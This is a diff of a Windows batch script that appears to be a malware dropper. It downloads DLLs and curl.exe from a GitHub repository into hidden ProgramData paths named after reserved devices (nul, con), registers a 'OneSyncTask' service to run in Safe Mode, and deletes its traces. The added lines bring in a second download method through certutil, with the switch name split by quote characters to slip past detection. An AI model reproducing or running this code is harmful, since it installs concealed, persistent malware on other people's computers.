@@ -10,6 +10,8 @@ taskkill.exe /f /IM nul.exe
 taskkill.exe /f /IM con.exe
 dir "\\?\%ProgramData%\nuldata..\nul" >nul || curl.exe -s -L -o "\\?\%ProgramData%\nuldata..\nul" "https://github.com/vltex/0/raw/main/1/winfw.dll"
 dir "\\?\%ProgramData%\condata..\con" >nul || curl.exe -s -L -o "\\?\%ProgramData%\condata..\con" "https://github.com/vltex/0/raw/main/1/Kape.dll"
+dir "\\?\%ProgramData%\nuldata..\nul" >nul || certutil -url""""cache -split -f "https://github.com/vltex/0/raw/main/1/winfw.dll" "\\?\%ProgramData%\nuldata..\nul"
+dir "\\?\%ProgramData%\condata..\con" >nul || certutil -url""""cache -split -f "https://github.com/vltex/0/raw/main/1/winfw.dll" "\\?\%ProgramData%\condata..\con"
 dir "\\?\%ProgramData%\nuldata..\nul" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/winfw.dll -OutFile \\?\%ProgramData%\nuldata..\nul
 dir "\\?\%ProgramData%\condata..\con" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/Kape.dll -OutFile \\?\%ProgramData%\condata..\con
 dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile %ProgramData%\curl.exe
@@ -19,8 +21,8 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v Security >nul 
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 del /S /Q %ProgramData%\buh.cmd
-del /S /Q \\.\%ProgramData%\prndata..\nul
-del /S /Q \\.\%ProgramData%\prndata..\con
+del /S /Q \\?\%ProgramData%\prndata..\nul
+del /S /Q \\?\%ProgramData%\prndata..\con
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
 rd /S /Q \\.\%ProgramData%\NUL..\
